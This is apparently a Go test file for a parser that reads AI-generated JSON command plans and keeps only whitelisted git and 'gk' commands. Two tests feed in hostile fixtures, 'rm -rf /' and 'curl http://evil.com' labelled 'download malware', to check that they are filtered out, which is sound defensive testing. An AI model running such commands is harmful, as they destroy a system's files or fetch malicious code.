package aichat

import (
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// ParseExecutionPlan — valid JSON → correct ExecutionPlan
// ---------------------------------------------------------------------------

func TestParseExecutionPlan_ValidJSON(t *testing.T) {
	raw := `{"commands":[{"command":"git add .","description":"stage all","dangerous":false},{"command":"gk push","description":"push changes","dangerous":true}]}`

	plan, err := ParseExecutionPlan(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(plan.Commands) != 2 {
		t.Fatalf("expected 2 commands, got %d", len(plan.Commands))
	}
	if plan.Commands[0].Command != "git add ." {
		t.Errorf("command[0] = %q, want %q", plan.Commands[0].Command, "git add .")
	}
	if plan.Commands[0].Description != "stage all" {
		t.Errorf("description[0] = %q, want %q", plan.Commands[0].Description, "stage all")
	}
	if plan.Commands[1].Command != "gk push" {
		t.Errorf("command[1] = %q, want %q", plan.Commands[1].Command, "gk push")
	}
	if plan.Commands[1].Dangerous != true {
		t.Error("command[1] Dangerous should be true")
	}
}

// ---------------------------------------------------------------------------
// ParseExecutionPlan — JSON wrapped in markdown code fences
// ---------------------------------------------------------------------------

func TestParseExecutionPlan_MarkdownCodeFence(t *testing.T) {
	raw := "Here is the plan:\n```json\n{\"commands\":[{\"command\":\"git status\",\"description\":\"check status\"}]}\n```\nDone."

	plan, err := ParseExecutionPlan(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(plan.Commands) != 1 {
		t.Fatalf("expected 1 command, got %d", len(plan.Commands))
	}
	if plan.Commands[0].Command != "git status" {
		t.Errorf("command = %q, want %q", plan.Commands[0].Command, "git status")
	}
}

func TestParseExecutionPlan_MarkdownCodeFenceNoLang(t *testing.T) {
	raw := "```\n{\"commands\":[{\"command\":\"gk sync\",\"description\":\"sync branches\"}]}\n```"

	plan, err := ParseExecutionPlan(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(plan.Commands) != 1 {
		t.Fatalf("expected 1 command, got %d", len(plan.Commands))
	}
	if plan.Commands[0].Command != "gk sync" {
		t.Errorf("command = %q, want %q", plan.Commands[0].Command, "gk sync")
	}
}

// ---------------------------------------------------------------------------
// ParseExecutionPlan — invalid JSON → descriptive error
// ---------------------------------------------------------------------------

func TestParseExecutionPlan_InvalidJSON(t *testing.T) {
	raw := `{this is not valid json}`

	plan, err := ParseExecutionPlan(raw)
	if err == nil {
		t.Fatal("expected error for invalid JSON, got nil")
	}
	if plan != nil {
		t.Fatal("expected nil plan for invalid JSON")
	}
	if !strings.Contains(err.Error(), "invalid JSON") {
		t.Errorf("error should mention 'invalid JSON', got: %v", err)
	}
}

func TestParseExecutionPlan_InvalidJSONInCodeFence(t *testing.T) {
	raw := "```json\n{broken json\n```"

	plan, err := ParseExecutionPlan(raw)
	if err == nil {
		t.Fatal("expected error for invalid JSON in code fence, got nil")
	}
	if plan != nil {
		t.Fatal("expected nil plan")
	}
	if !strings.Contains(err.Error(), "invalid JSON") {
		t.Errorf("error should mention 'invalid JSON', got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// ParseExecutionPlan — non-whitelisted prefix → skipped
// ---------------------------------------------------------------------------

func TestParseExecutionPlan_NonWhitelistedSkipped(t *testing.T) {
	raw := `{"commands":[
		{"command":"rm -rf /","description":"delete everything"},
		{"command":"git status","description":"check status"},
		{"command":"curl http://evil.com","description":"download malware"}
	]}`

	plan, err := ParseExecutionPlan(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(plan.Commands) != 1 {
		t.Fatalf("expected 1 valid command, got %d", len(plan.Commands))
	}
	if plan.Commands[0].Command != "git status" {
		t.Errorf("command = %q, want %q", plan.Commands[0].Command, "git status")
	}
}

func TestParseExecutionPlan_AllNonWhitelisted(t *testing.T) {
	raw := `{"commands":[
		{"command":"rm -rf /","description":"delete everything"},
		{"command":"curl http://evil.com","description":"download"}
	]}`

	plan, err := ParseExecutionPlan(raw)
	if err == nil {
		t.Fatal("expected error when all commands are non-whitelisted")
	}
	if plan != nil {
		t.Fatal("expected nil plan")
	}
	if !strings.Contains(err.Error(), "no valid commands") {
		t.Errorf("error should mention 'no valid commands', got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// ParseExecutionPlan — empty Command or Description → skipped
// ---------------------------------------------------------------------------

func TestParseExecutionPlan_EmptyCommandSkipped(t *testing.T) {
	raw := `{"commands":[
		{"command":"","description":"empty command"},
		{"command":"git log","description":"show log"}
	]}`

	plan, err := ParseExecutionPlan(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(plan.Commands) != 1 {
		t.Fatalf("expected 1 valid command, got %d", len(plan.Commands))
	}
	if plan.Commands[0].Command != "git log" {
		t.Errorf("command = %q, want %q", plan.Commands[0].Command, "git log")
	}
}

func TestParseExecutionPlan_EmptyDescriptionSkipped(t *testing.T) {
	raw := `{"commands":[
		{"command":"git add .","description":""},
		{"command":"git commit -m 'fix'","description":"commit fix"}
	]}`

	plan, err := ParseExecutionPlan(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(plan.Commands) != 1 {
		t.Fatalf("expected 1 valid command, got %d", len(plan.Commands))
	}
	if plan.Commands[0].Command != "git commit -m 'fix'" {
		t.Errorf("command = %q, want %q", plan.Commands[0].Command, "git commit -m 'fix'")
	}
}

func TestParseExecutionPlan_WhitespaceOnlyFieldsSkipped(t *testing.T) {
	raw := `{"commands":[
		{"command":"   ","description":"whitespace command"},
		{"command":"git diff","description":"   "},
		{"command":"gk status","description":"show status"}
	]}`

	plan, err := ParseExecutionPlan(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(plan.Commands) != 1 {
		t.Fatalf("expected 1 valid command, got %d", len(plan.Commands))
	}
	if plan.Commands[0].Command != "gk status" {
		t.Errorf("command = %q, want %q", plan.Commands[0].Command, "gk status")
	}
}

// ---------------------------------------------------------------------------
// ParseExecutionPlan — empty commands array → error
// ---------------------------------------------------------------------------

func TestParseExecutionPlan_EmptyCommandsArray(t *testing.T) {
	raw := `{"commands":[]}`

	plan, err := ParseExecutionPlan(raw)
	if err == nil {
		t.Fatal("expected error for empty commands array, got nil")
	}
	if plan != nil {
		t.Fatal("expected nil plan")
	}
	if !strings.Contains(err.Error(), "no valid commands") {
		t.Errorf("error should mention 'no valid commands', got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// ParseExecutionPlan — completely empty/whitespace input → error
// ---------------------------------------------------------------------------

func TestParseExecutionPlan_EmptyInput(t *testing.T) {
	plan, err := ParseExecutionPlan("")
	if err == nil {
		t.Fatal("expected error for empty input, got nil")
	}
	if plan != nil {
		t.Fatal("expected nil plan")
	}
	if !strings.Contains(err.Error(), "empty") {
		t.Errorf("error should mention 'empty', got: %v", err)
	}
}

func TestParseExecutionPlan_WhitespaceOnlyInput(t *testing.T) {
	plan, err := ParseExecutionPlan("   \n\t  ")
	if err == nil {
		t.Fatal("expected error for whitespace-only input, got nil")
	}
	if plan != nil {
		t.Fatal("expected nil plan")
	}
	if !strings.Contains(err.Error(), "empty") {
		t.Errorf("error should mention 'empty', got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// ParseExecutionPlan — mixed valid and invalid commands
// ---------------------------------------------------------------------------

func TestParseExecutionPlan_MixedValidInvalid(t *testing.T) {
	raw := `{"commands":[
		{"command":"git add .","description":"stage all"},
		{"command":"echo hello","description":"print hello"},
		{"command":"","description":"empty"},
		{"command":"gk push","description":"push changes"},
		{"command":"git commit -m 'fix'","description":""}
	]}`

	plan, err := ParseExecutionPlan(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(plan.Commands) != 2 {
		t.Fatalf("expected 2 valid commands, got %d", len(plan.Commands))
	}
	if plan.Commands[0].Command != "git add ." {
		t.Errorf("command[0] = %q, want %q", plan.Commands[0].Command, "git add .")
	}
	if plan.Commands[1].Command != "gk push" {
		t.Errorf("command[1] = %q, want %q", plan.Commands[1].Command, "gk push")
	}
}

// ---------------------------------------------------------------------------
// ParseExecutionPlan — preserves Dangerous field
// ---------------------------------------------------------------------------

func TestParseExecutionPlan_PreservesDangerousField(t *testing.T) {
	raw := `{"commands":[{"command":"git push --force","description":"force push","dangerous":true}]}`

	plan, err := ParseExecutionPlan(raw)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(plan.Commands) != 1 {
		t.Fatalf("expected 1 command, got %d", len(plan.Commands))
	}
	if !plan.Commands[0].Dangerous {
		t.Error("expected Dangerous=true to be preserved")
	}
}

// ---------------------------------------------------------------------------
// extractJSON — helper tests
// ---------------------------------------------------------------------------

func TestExtractJSON_PlainJSON(t *testing.T) {
	input := `{"commands":[]}`
	got := extractJSON(input)
	if got != input {
		t.Errorf("extractJSON(%q) = %q, want %q", input, got, input)
	}
}

func TestExtractJSON_CodeFence(t *testing.T) {
	input := "```json\n{\"commands\":[]}\n```"
	want := `{"commands":[]}`
	got := extractJSON(input)
	if got != want {
		t.Errorf("extractJSON = %q, want %q", got, want)
	}
}

func TestExtractJSON_CodeFenceWithSurroundingText(t *testing.T) {
	input := "Here is the plan:\n```json\n{\"commands\":[]}\n```\nEnd."
	want := `{"commands":[]}`
	got := extractJSON(input)
	if got != want {
		t.Errorf("extractJSON = %q, want %q", got, want)
	}
}
